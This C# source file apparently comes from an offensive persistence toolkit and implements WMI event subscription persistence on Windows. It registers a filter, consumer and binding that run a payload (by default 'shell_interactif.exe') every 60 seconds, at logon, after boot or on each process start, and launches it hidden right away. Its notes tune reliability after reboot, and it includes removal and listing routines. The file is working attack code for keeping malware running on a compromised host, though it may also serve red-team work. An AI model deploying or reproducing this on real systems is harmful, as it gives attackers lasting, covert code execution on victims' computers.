using System;
using System.Diagnostics;
using System.Management;

namespace Persist
{
    /// <summary>
    /// WMI Event Subscription persistence.
    ///
    /// Creates three WMI objects in ROOT\subscription:
    ///   1. __EventFilter       — defines WHEN to fire (e.g. every 60 s, at logon, on process start)
    ///   2. CommandLineEventConsumer — defines WHAT to run (the payload)
    ///   3. __FilterToConsumerBinding — links filter → consumer
    ///
    /// Trigger options (-o):
    ///   interval   — fires every 60 seconds (TimerInstruction, default)
    ///   logon      — fires on any interactive logon (Win32_LogonSession creation)
    ///   startup    — fires when userinit.exe is created (boot/logon detection)
    ///   process    — fires when a new process is created (Win32_Process creation)
    ///
    /// Requires admin rights (writes to ROOT\subscription).
    ///
    /// FIX HISTORY:
    ///   [FIX-1] EnsureTimerInstruction: __IntervalTimerInstruction must be created in
    ///           ROOT\subscription (not ROOT\cimv2). The __TimerEvent is dispatched
    ///           within the subscription namespace — placing the instruction in cimv2
    ///           means the EventFilter in ROOT\subscription never receives it.
    ///
    ///   [FIX-2] CommandLineEventConsumer.RunInteractively must be false for
    ///           better reboot reliability in shell-only mode (service context).
    ///
    ///   [FIX-3] startup trigger moved to SystemUpTime-based query (instead of
    ///           userinit.exe creation) to avoid missing early-boot/logon races.
    ///
    ///   [FIX-4] CommandLineEventConsumer.ExecutablePath is now populated when
    ///           possible, improving payload launch reliability after reboot.
    /// </summary>
    [System.Runtime.Versioning.SupportedOSPlatform("windows")]
    public class WmiSubscription : Persistence
    {
        private const string DefaultPayload = "shell_interactif.exe";

        // WMI namespace where permanent subscriptions live
        private const string WmiNamespace = @"\\.\ROOT\subscription";

        // Valid trigger options
        private static readonly string[] ValidOptions = { "interval", "logon", "startup", "process" };

        public WmiSubscription(
            string persistMethod, string command, string commandArg,
            string theKey, string theVal, string theName,
            string filePath, string status, string option)
            : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option)
        {
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);
        }

        // ------------------------------------------------------------------ //
        //  Router                                                              //
        // ------------------------------------------------------------------ //

        public void initialize(
            string persistMethod, string command, string commandArg,
            string theKey, string theVal, string theName,
            string filePath, string status, string option)
        {
            if (status.ToLower().Equals("add"))
            {
                if (theName.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a subscription name (-n). See help (-h).");
                    return;
                }
                addPersistence(command, commandArg, theName, option);
            }

            else if (status.ToLower().Equals("remove"))
            {
                if (theName.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a subscription name (-n). See help (-h).");
                    return;
                }
                removePersistence(theName);
            }

            else if (status.ToLower().Equals("check"))
            {
                checkPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);
            }

            else if (status.ToLower().Equals("list"))
            {
                listPersistence(theName);
            }

            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Invalid method given. Must give add, remove, check or list. See help (-h).");
            }
        }

        // ------------------------------------------------------------------ //
        //  ADD                                                                 //
        // ------------------------------------------------------------------ //

        public void addPersistence(string command, string commandArg, string theName, string option)
{
    Console.WriteLine("[DEBUG] Step 1 - Entering addPersistence");
    Console.WriteLine($"[DEBUG] command={command}");
    Console.WriteLine($"[DEBUG] commandArg={commandArg}");
    Console.WriteLine($"[DEBUG] theName={theName}");
    Console.WriteLine($"[DEBUG] option={option}");
    
    string payload = BuildPayload(command, commandArg);
    Console.WriteLine($"[DEBUG] payload={payload}");
    
    string trigger = NormalizeOption(option);
    Console.WriteLine($"[DEBUG] trigger={trigger}");

    Console.WriteLine("");
    Console.WriteLine("[*] INFO: Adding WMI subscription persistence");
    Console.WriteLine("[*] INFO: Subscription Name : " + theName);
    Console.WriteLine("[*] INFO: Payload           : " + payload);
    Console.WriteLine("[*] INFO: Trigger           : " + trigger);
    Console.WriteLine("");

    // Validate trigger option
    if (!IsValidOption(trigger))
    {
        Console.WriteLine("[-] ERROR: Invalid trigger option. Use: interval, logon, startup, process. See help (-h).");
        return;
    }

    // Check admin rights — ROOT\subscription requires elevation
    if (!lib.Utils.IsUserAnAdmin())
    {
        Console.WriteLine("[-] ERROR: WMI subscription persistence requires administrator privileges.");
        return;
    }

    // Check if subscription already exists
    if (WmiObjectExists("__EventFilter", theName))
    {
        Console.WriteLine("[-] ERROR: WMI subscription with that name already exists. Remove it first.");
        return;
    }

    try
    {
        Console.WriteLine("[DEBUG] Creating ManagementScope...");
        ManagementScope scope = new ManagementScope(@"root\subscription");
        scope.Connect();
        Console.WriteLine("[DEBUG] Scope connected successfully");

        // ---- 0. For interval trigger: ensure timer instruction exists ----
        if (trigger.Equals("interval"))
        {
            EnsureTimerInstruction(scope);
            Console.WriteLine("[+] SUCCESS: __IntervalTimerInstruction (60s) ensured in ROOT\\subscription.");
        }

        // ---- 1. Create __EventFilter ----
        Console.WriteLine("[DEBUG] Creating EventFilter...");
        ManagementClass filterClass = new ManagementClass(scope,
            new ManagementPath("__EventFilter"), null);

        ManagementObject filter = filterClass.CreateInstance();
        filter["Name"]          = theName;
        filter["QueryLanguage"] = "WQL";
        filter["Query"]         = BuildWqlQuery(trigger);
        filter["EventNameSpace"]= BuildEventNamespace(trigger);
        filter.Put();
        Console.WriteLine("[+] SUCCESS: __EventFilter created.");

        // ---- 2. Create CommandLineEventConsumer ----
        Console.WriteLine("[DEBUG] Creating CommandLineEventConsumer...");
        ManagementClass consumerClass = new ManagementClass(scope,
            new ManagementPath("CommandLineEventConsumer"), null);

        ManagementObject consumer = consumerClass.CreateInstance();
        consumer["Name"]                = theName;
        consumer["CommandLineTemplate"] = payload;
        string executablePath = ExtractExecutablePath(payload);
        if (!string.IsNullOrWhiteSpace(executablePath))
        {
            consumer["ExecutablePath"] = executablePath;
        }
        consumer["RunInteractively"]    = false;
        consumer.Put();
        Console.WriteLine("[+] SUCCESS: CommandLineEventConsumer created.");

        // ---- 3. Create __FilterToConsumerBinding ----
        Console.WriteLine("[DEBUG] Creating Binding...");
        ManagementClass bindingClass = new ManagementClass(scope,
            new ManagementPath("__FilterToConsumerBinding"), null);

        ManagementObject binding = bindingClass.CreateInstance();
        binding["Filter"]   = filter.Path.RelativePath;
        binding["Consumer"] = consumer.Path.RelativePath;
        binding.Put();
        Console.WriteLine("[+] SUCCESS: __FilterToConsumerBinding created.");
        Console.WriteLine("");
        Console.WriteLine("[+] SUCCESS: WMI subscription persistence added.");
        Console.WriteLine("[*] INFO: Subscription will trigger on: " + trigger);
        Console.WriteLine("[*] INFO: No registry key or scheduled task created.");
    }
    catch (UnauthorizedAccessException)
    {
        Console.WriteLine("[-] ERROR: Access denied. Run as administrator to create WMI subscriptions.");
        return;
    }
    catch (ManagementException mex)
    {
        Console.WriteLine($"[DEBUG] ManagementException: {mex.Message}");
        Console.WriteLine($"[DEBUG] Error Code: {mex.ErrorCode}");
        Console.WriteLine("[-] ERROR: WMI error: " + mex.Message);
        return;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[DEBUG] Exception Type: {ex.GetType().FullName}");
        Console.WriteLine($"[DEBUG] Message: {ex.Message}");
        Console.WriteLine($"[DEBUG] StackTrace: {ex.StackTrace}");
        if (ex.InnerException != null)
        {
            Console.WriteLine($"[DEBUG] Inner Exception: {ex.InnerException.Message}");
        }
        Console.WriteLine("[-] ERROR: Unexpected error: " + ex.Message);
        return;
    }

    // Immediately execute payload
    ExecutePersistencePayload(command, commandArg);
}

        // ------------------------------------------------------------------ //
        //  REMOVE                                                              //
        // ------------------------------------------------------------------ //

        public void removePersistence(string theName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing WMI subscription persistence");
            Console.WriteLine("[*] INFO: Subscription Name: " + theName);
            Console.WriteLine("");

            if (!lib.Utils.IsUserAnAdmin())
            {
                Console.WriteLine("[-] ERROR: WMI subscription removal requires administrator privileges.");
                return;
            }

            if (!WmiObjectExists("__EventFilter", theName))
            {
                Console.WriteLine("[-] ERROR: WMI subscription with that name does not exist.");
                return;
            }

            bool allRemoved = true;

            // Remove in reverse order: binding → consumer → filter
            allRemoved &= DeleteWmiObject("__FilterToConsumerBinding", theName);
            allRemoved &= DeleteWmiObject("CommandLineEventConsumer",  theName);
            allRemoved &= DeleteWmiObject("__EventFilter",             theName);

            // Also clean up the timer instruction if no other interval subscriptions remain
            TryRemoveOrphanedTimerInstruction();

            if (allRemoved)
            {
                Console.WriteLine("[+] SUCCESS: WMI subscription removed successfully.");
                Console.WriteLine("[*] INFO: Subscription Name: " + theName);
            }
            else
            {
                Console.WriteLine("[!] WARN: Some WMI objects could not be removed. Check manually in ROOT\\subscription.");
            }

        } // end removePersistence

        // ------------------------------------------------------------------ //
        //  CHECK                                                               //
        // ------------------------------------------------------------------ //

        public void checkPersistence(
            string persistMethod, string command, string commandArg,
            string theKey, string theVal, string theName,
            string filePath, string status, string option)
        {
            string trigger = NormalizeOption(option);

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking WMI subscription arguments.");
            Console.WriteLine("");

            // Validate name
            if (string.IsNullOrWhiteSpace(theName))
            {
                Console.WriteLine("[-] ERROR: Subscription name is required (-n). See help (-h).");
                return;
            }
            Console.WriteLine("[+] SUCCESS: Subscription name provided: " + theName);

            // Validate trigger option
            if (!IsValidOption(trigger))
            {
                Console.WriteLine("[-] ERROR: Invalid trigger option (-o). Must be: interval, logon, startup, process.");
                return;
            }
            Console.WriteLine("[+] SUCCESS: Trigger option is valid: " + trigger);

            // Check admin rights
            if (!lib.Utils.IsUserAnAdmin())
            {
                Console.WriteLine("[-] ERROR: You do NOT have administrator privileges. WMI subscriptions require elevation.");
            }
            else
            {
                Console.WriteLine("[+] SUCCESS: You have administrator privileges.");
            }

            // Check if subscription already exists
            bool exists = WmiObjectExists("__EventFilter", theName);
            if (exists)
            {
                Console.WriteLine("[-] ERROR: WMI subscription '" + theName + "' already exists — add would be blocked.");
            }
            else
            {
                Console.WriteLine("[+] SUCCESS: Subscription name '" + theName + "' is available.");
            }

            // Show what WQL query would be created
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: WQL query that would be used:");
            Console.WriteLine(BuildWqlQuery(trigger));
            Console.WriteLine("[*] INFO: Payload that would be executed:");
            Console.WriteLine(BuildPayload(command, commandArg));

        } // end checkPersistence

        // ------------------------------------------------------------------ //
        //  LIST                                                                //
        // ------------------------------------------------------------------ //

        public void listPersistence(string theName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Listing WMI subscription persistence entries.");
            Console.WriteLine("");

            if (!lib.Utils.IsUserAnAdmin())
            {
                Console.WriteLine("[-] ERROR: Listing WMI subscriptions requires administrator privileges.");
                return;
            }

            try
            {
                ManagementScope scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                // If a specific name is given, list only that subscription
                string filterClause = string.IsNullOrWhiteSpace(theName)
                    ? ""
                    : $" WHERE Name = '{EscapeWql(theName)}'";

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    scope,
                    new ObjectQuery($"SELECT * FROM __EventFilter{filterClause}"));

                ManagementObjectCollection filters = searcher.Get();

                if (filters.Count == 0)
                {
                    Console.WriteLine("[*] INFO: No WMI subscription persistence entries found.");
                    return;
                }

                foreach (ManagementObject filter in filters)
                {
                    string name  = filter["Name"]?.ToString()  ?? "(unknown)";
                    string query = filter["Query"]?.ToString() ?? "(none)";

                    Console.WriteLine("[*] INFO: SUBSCRIPTION NAME:");
                    Console.WriteLine(name);
                    Console.WriteLine("");

                    Console.WriteLine("[*] INFO: EVENT FILTER (WQL):");
                    Console.WriteLine(query);
                    Console.WriteLine("");

                    // Fetch the matching consumer
                    ManagementObjectSearcher cs = new ManagementObjectSearcher(
                        scope,
                        new ObjectQuery($"SELECT * FROM CommandLineEventConsumer WHERE Name = '{EscapeWql(name)}'"));

                    foreach (ManagementObject consumer in cs.Get())
                    {
                        Console.WriteLine("[*] INFO: CONSUMER COMMAND LINE:");
                        Console.WriteLine(consumer["CommandLineTemplate"]?.ToString() ?? "(none)");
                        Console.WriteLine("[*] INFO: RUN INTERACTIVELY:");
                        Console.WriteLine(consumer["RunInteractively"]?.ToString() ?? "(unknown)");
                        Console.WriteLine("");
                    }

                    // Binding status
                    ManagementObjectSearcher bs = new ManagementObjectSearcher(
                        scope,
                        new ObjectQuery($"SELECT * FROM __FilterToConsumerBinding WHERE Filter = \"__EventFilter.Name='{EscapeWql(name)}'\""));

                    int bindingCount = 0;
                    foreach (ManagementObject _ in bs.Get()) bindingCount++;

                    Console.WriteLine("[*] INFO: BINDING STATUS:");
                    Console.WriteLine(bindingCount > 0
                        ? "Active (" + bindingCount + " binding(s))"
                        : "WARNING: No binding found — subscription is inactive.");
                    Console.WriteLine("");
                    Console.WriteLine("");
                    Console.WriteLine("");
                }
            }
            catch (ManagementException mex)
            {
                Console.WriteLine("[-] ERROR: WMI error while listing: " + mex.Message);
            }
            catch (Exception ex)
{
    Console.WriteLine($"[DEBUG] Exception Type: {ex.GetType().Name}");
    Console.WriteLine($"[DEBUG] Message: {ex.Message}");
    Console.WriteLine($"[DEBUG] StackTrace: {ex.StackTrace}");
    if (ex.InnerException != null)
    {
        Console.WriteLine($"[DEBUG] Inner Exception: {ex.InnerException.Message}");
    }
    Console.WriteLine("[-] ERROR: Unexpected persistence error: " + ex.Message);
    return;
}

        } // end listPersistence

        // ------------------------------------------------------------------ //
        //  Immediate payload execution (same pattern as RegistryPersist)      //
        // ------------------------------------------------------------------ //

        private static void ExecutePersistencePayload(string command, string commandArg)
        {
            string payload = BuildPayload(command, commandArg);
            if (string.IsNullOrWhiteSpace(payload))
                return;

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName        = "cmd.exe",
                    Arguments       = $"/c start \"\" {payload}",
                    UseShellExecute = false,
                    CreateNoWindow  = true
                });
                Console.WriteLine("[*] INFO: Persistence payload launched immediately.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] WARN: Persistence was added but immediate launch failed: " + ex.Message);
            }
        }

        // ------------------------------------------------------------------ //
        //  WMI helpers                                                         //
        // ------------------------------------------------------------------ //

        /// <summary>Returns true if a WMI object with the given Name exists in ROOT\subscription.</summary>
        private static bool WmiObjectExists(string wmiClass, string name)
        {
            try
            {
                ManagementScope scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    scope,
                    new ObjectQuery($"SELECT * FROM {wmiClass} WHERE Name = '{EscapeWql(name)}'"));

                return searcher.Get().Count > 0;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Deletes a WMI object by Name from ROOT\subscription.
        /// Bindings don't have a Name property — they are matched via Filter path.
        /// </summary>
        private static bool DeleteWmiObject(string wmiClass, string name)
        {
            try
            {
                ManagementScope scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                string query = wmiClass.Equals("__FilterToConsumerBinding")
                    ? $"SELECT * FROM __FilterToConsumerBinding WHERE Filter = \"__EventFilter.Name='{EscapeWql(name)}'\""
                    : $"SELECT * FROM {wmiClass} WHERE Name = '{EscapeWql(name)}'";

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery(query));
                ManagementObjectCollection results = searcher.Get();

                if (results.Count == 0)
                {
                    Console.WriteLine("[!] WARN: " + wmiClass + " '" + name + "' not found — may already be removed.");
                    return true; // not an error if it's already gone
                }

                foreach (ManagementObject obj in results)
                {
                    obj.Delete();
                    Console.WriteLine("[+] SUCCESS: " + wmiClass + " '" + name + "' removed.");
                }

                return true;
            }
            catch (ManagementException mex)
            {
                Console.WriteLine("[-] ERROR: Failed to remove " + wmiClass + ": " + mex.Message);
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ERROR: Unexpected error removing " + wmiClass + ": " + ex.Message);
                return false;
            }
        }

        /// <summary>
        /// After removing a subscription, clean up the PersistTimer instruction
        /// if no other __EventFilter references it.
        /// </summary>
        private static void TryRemoveOrphanedTimerInstruction()
        {
            try
            {
                ManagementScope subScope = new ManagementScope(WmiNamespace);
                subScope.Connect();

                // Check if any remaining EventFilter still uses our timer
                ManagementObjectSearcher check = new ManagementObjectSearcher(
                    subScope,
                    new ObjectQuery("SELECT * FROM __EventFilter WHERE Query LIKE '%PersistTimer%'"));

                if (check.Get().Count > 0)
                    return; // still in use by another subscription

                // No remaining subscriptions use it — remove the timer instruction
                ManagementObjectSearcher timerSearch = new ManagementObjectSearcher(
                    subScope,
                    new ObjectQuery("SELECT * FROM __IntervalTimerInstruction WHERE TimerID = 'PersistTimer'"));

                foreach (ManagementObject timer in timerSearch.Get())
                {
                    timer.Delete();
                    Console.WriteLine("[+] SUCCESS: Orphaned __IntervalTimerInstruction 'PersistTimer' removed.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] WARN: Could not clean up timer instruction: " + ex.Message);
            }
        }

        // ------------------------------------------------------------------ //
        //  WQL query builder based on trigger option                          //
        // ------------------------------------------------------------------ //

        /// <summary>
        /// Builds the WQL query for the __EventFilter based on the chosen trigger.
        ///
        /// TRIGGER DESIGN NOTES:
        ///
        /// interval — Uses __IntervalTimerInstruction created in ROOT\subscription.
        ///            [FIX-1] Timer must live in ROOT\subscription, not ROOT\cimv2.
        ///
        /// logon    — Watches for Win32_LogonSession creation with LogonType=2 (interactive).
        ///            WITHIN 15 means WMI polls every 15 s.
        ///
        /// startup  — Watches SystemUpTime after boot.
        ///            NOTE: On some VMs, WMI/perf classes may not be ready early,
        ///            and a narrow uptime window can be missed. We use a wider
        ///            window to make post-reboot execution reliable.
        ///
        /// process  — Watches for any new Win32_Process creation (noisy, good for testing).
        /// </summary>
        private static string BuildWqlQuery(string trigger)
        {
            switch (trigger)
            {
                case "interval":
                    // Fires every 60 seconds via __IntervalTimerInstruction.
                    // TimerID must match the one set in EnsureTimerInstruction.
                    return "SELECT * FROM __TimerEvent WHERE TimerID = 'PersistTimer'";

                case "logon":
                    // Fires when an interactive logon session (LogonType=2) is created.
                    return "SELECT * FROM __InstanceCreationEvent WITHIN 15 " +
                           "WHERE TargetInstance ISA 'Win32_LogonSession' " +
                           "AND TargetInstance.LogonType = 2";

                case "startup":
                    // Fires during a post-boot uptime window.
                    // Wider than the initial 90-150s to avoid missing the event
                    // on slow boots or when perf/WMI providers start late.
                    //
                    // Trade-off: can fire multiple times during the window.
                    return "SELECT * FROM __InstanceModificationEvent WITHIN 10 " +
                           "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
                           "AND TargetInstance.SystemUpTime >= 60 " +
                           "AND TargetInstance.SystemUpTime < 900";

                case "process":
                    // Fires on every new process creation (broad / noisy — good for testing).
                    return "SELECT * FROM __InstanceCreationEvent WITHIN 10 " +
                           "WHERE TargetInstance ISA 'Win32_Process'";

                default:
                    return "SELECT * FROM __TimerEvent WHERE TimerID = 'PersistTimer'";
            }
        }

        /// <summary>
        /// Returns the WMI EventNameSpace for the filter query.
        /// All supported triggers subscribe to events in ROOT\cimv2.
        /// The __EventFilter object itself lives in ROOT\subscription (WmiNamespace),
        /// but EventNameSpace tells WMI where to watch for the source events.
        /// Exception: interval trigger uses ROOT\subscription for the timer event.
        /// </summary>
        private static string BuildEventNamespace(string trigger)
        {
            // interval fires a __TimerEvent inside ROOT\subscription itself
            if (trigger.Equals("interval"))
                return @"root\subscription";

            // all other triggers watch for events in ROOT\cimv2
            return @"root\cimv2";
        }

        /// <summary>
        /// Creates a __IntervalTimerInstruction in ROOT\subscription so the timer
        /// event fires reliably every 60 seconds within the subscription namespace.
        ///
        /// [FIX-1] Previously this was (incorrectly) placed in ROOT\cimv2.
        ///         A __TimerEvent dispatched from ROOT\subscription cannot be
        ///         received by an __EventFilter registered in ROOT\subscription
        ///         if the instruction is in a different namespace.
        /// </summary>
        private static void EnsureTimerInstruction(ManagementScope subscriptionScope)
        {
            const string timerId = "PersistTimer";

            // Check if timer instruction already exists in ROOT\subscription
            ManagementObjectSearcher check = new ManagementObjectSearcher(
                subscriptionScope,
                new ObjectQuery($"SELECT * FROM __IntervalTimerInstruction WHERE TimerID = '{timerId}'"));

            if (check.Get().Count > 0)
                return; // already exists

            // [FIX-1] Create in ROOT\subscription (subscriptionScope), not ROOT\cimv2
            ManagementClass timerClass = new ManagementClass(
                subscriptionScope,
                new ManagementPath("__IntervalTimerInstruction"), null);

            ManagementObject timer = timerClass.CreateInstance();
            timer["TimerID"]               = timerId;
            timer["IntervalBetweenEvents"] = (uint)60_000; // 60 000 ms = 60 seconds
            timer.Put();
        }

        // ------------------------------------------------------------------ //
        //  Helpers                                                             //
        // ------------------------------------------------------------------ //

        private static string BuildPayload(string command, string commandArg)
        {
            string merged = $"{command} {commandArg}".Trim();
            return string.IsNullOrWhiteSpace(merged) ? DefaultPayload : merged;
        }

        private static string NormalizeOption(string option)
        {
            string o = (option ?? "").Trim().ToLower();
            return string.IsNullOrWhiteSpace(o) ? "interval" : o;
        }

        private static bool IsValidOption(string option)
        {
            foreach (string v in ValidOptions)
                if (v.Equals(option)) return true;
            return false;
        }

        /// <summary>
        /// Extracts executable path from a command line for CommandLineEventConsumer.ExecutablePath.
        /// Supports quoted and unquoted executable forms.
        /// </summary>
        private static string ExtractExecutablePath(string payload)
        {
            string value = (payload ?? string.Empty).Trim();
            if (string.IsNullOrWhiteSpace(value))
                return string.Empty;

            if (value.StartsWith("\"", StringComparison.Ordinal))
            {
                int closingQuote = value.IndexOf('"', 1);
                if (closingQuote > 1)
                    return value.Substring(1, closingQuote - 1);
            }

            int firstSpace = value.IndexOf(' ');
            if (firstSpace > 0)
                return value.Substring(0, firstSpace);

            return value;
        }

        /// <summary>Escapes single quotes in WQL string literals.</summary>
        private static string EscapeWql(string value)
        {
            return (value ?? "").Replace("'", "\\'");
        }

    } // end class

} // end namespace